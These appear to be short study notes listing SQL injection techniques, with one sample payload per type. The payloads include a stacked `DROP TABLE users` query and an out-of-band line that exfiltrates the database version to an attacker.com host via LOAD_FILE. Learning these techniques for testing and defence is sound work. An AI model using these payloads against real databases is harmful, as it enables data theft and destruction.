Types of sql injection:
- `Inline Queries`: Uncommon one that need custom implementation. `SELECT (SELECT @@version) from'
- `Stacked Queries`: Making mulitple of queries after the original one.  `; DROP TABLE users`
- `Error-based`: If the website show error messages, then we abuse this by feeding our custom query to see it as error. `AND GTID_SUBSET(@@version,0)'
- `UNION query-based`: rely on Unions. `UNION ALL SELECT 1,@@version,3`
- `Boolean-based blind`: rely on True or false result. `AND 1=1`
- `Time-based    blind`: laverage time to make sure our query have been executed.`AND 1=IF(2>1,SLEEP(5),0)`
- `Out-of-band   blind`: when all methods fails, we try to ping back to our machine. `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`
